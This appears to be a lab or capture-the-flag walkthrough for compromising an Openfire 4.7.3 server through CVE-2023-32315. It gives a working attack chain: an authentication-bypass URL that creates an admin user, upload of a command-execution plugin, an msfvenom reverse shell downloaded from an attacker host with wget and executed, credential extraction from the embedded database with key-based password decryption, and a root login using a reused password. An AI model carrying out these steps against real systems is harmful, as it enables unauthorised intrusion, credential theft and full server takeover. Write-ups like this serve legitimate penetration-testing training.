# Openfire

Openfire `4.7.3` can expose the administrative console on TCP `9090`/`9091`. CVE-2023-32315 can create an admin user, and admin access can be used to upload a command-execution plugin.

## Discovery

Nmap may misidentify the console as Hadoop, but the `jive-*` strings are a useful Openfire clue:

```text
9090/tcp open  hadoop-tasktracker     Apache Hadoop
|_http-title: Site doesn't have a title (text/html).
| hadoop-tasktracker-info:
|_  Logs: jive-ibtn jive-btn-gradient

9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost, DNS:*.localhost
```

Browse to the admin console:

```text
http://TARGET:9090
Openfire, Version: 4.7.3
```

Afrog can identify CVE-2023-32315 paths:

```text
CVE-2023-32315-2 HIGH http://TARGET:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User
CVE-2023-32315 HIGH http://TARGET:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

## CVE-2023-32315 Admin Creation

Use the K3ysTr0K3R PoC to confirm the target is vulnerable and create an admin account:

```bash
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/refs/heads/main/CVE-2023-32315.py
python3 CVE-2023-32315.py -u http://TARGET:9090
```

Successful output:

```text
[+] Target is vulnerable
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW
```

After login, check users at:

```text
http://TARGET:9090/user-summary.jsp
```

Observed users:

```text
admin
b99aid
```

## Plugin Command Execution

Build the Openfire CVE plugin:

```bash
git clone https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass.git
cd CVE-2023-32315-Openfire-Bypass
mvn clean package
```

Successful build artifact:

```text
./target/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar
```

Upload the plugin through the admin console. A successful upload redirects to:

```text
http://TARGET:9090/plugin-admin.jsp?uploadsuccess=true
```

The shell plugin is available under:

```text
Server -> Server Settings -> Shell Plugin
http://TARGET:9090/plugins/org.jivesoftware.openfire.plugin.cve-openfire-plugin-assembly/cmd.jsp?action=command
```

The observed plugin password was:

```text
123
```

## Reverse Shell

Use the plugin command execution to download and execute an ELF reverse shell:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f elf -o shell.elf
python3 -m http.server 8000
nc -nlvp 80
```

Plugin commands:

```bash
wget -O /tmp/shell.elf http://ATTACKER_IP:8000/shell.elf
chmod 777 /tmp/shell.elf
/tmp/shell.elf
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
id
uid=114(openfire) gid=118(openfire) groups=118(openfire)
```

## Credential Hunting

Useful Openfire files:

```bash
cat /etc/openfire/openfire.xml
find / -type f -name openfire.xml 2>/dev/null
find / -type f -name openfire.properties 2>/dev/null
```

Observed paths and config:

```text
/etc/openfire/openfire.xml
/var/lib/openfire/embedded-db/openfire.properties

<oneTimeAccessToken>secretToken</oneTimeAccessToken>
<className>org.jivesoftware.database.EmbeddedConnectionProvider</className>
```

The embedded HSQLDB lives under `/var/lib/openfire/embedded-db/`. The encrypted `OFUSER` passwords and `OFPROPERTY` values were recovered from the database script file:

```bash
cd /var/lib/openfire/embedded-db
grep 'OFUSER' openfire.script
grep -i ofProperty openfire.script
```

Useful values:

```text
INSERT INTO OFUSER VALUES('admin',...,'a52a48e57def1a851c91e768042c5bf6078a0cac311d03fd47de71e23bdef5062cbb6f8d836d718d',...)
INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)
INSERT INTO OFPROPERTY VALUES('passwordKey','EOAJUe2Sqdlfqjk',0,NULL)
```

The `passwordKey` can decrypt `OFUSER` encrypted passwords with Openfire password decrypter tooling:

```bash
git clone https://github.com/z3rObyte/openfire-password-decrypter.git
python3 decrypter.py ENCRYPTEDPASSWORD EOAJUe2Sqdlfqjk
```

## Privilege Escalation

Try the recovered SMTP password for local privilege escalation:

```bash
su root
```

Successful root access used:

```text
OpenFireAtEveryone
```

Confirm:

```bash
id
cat /root/proof.txt
```

## References

- https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT
- https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass
- https://www.vulncheck.com/blog/openfire-cve-2023-32315
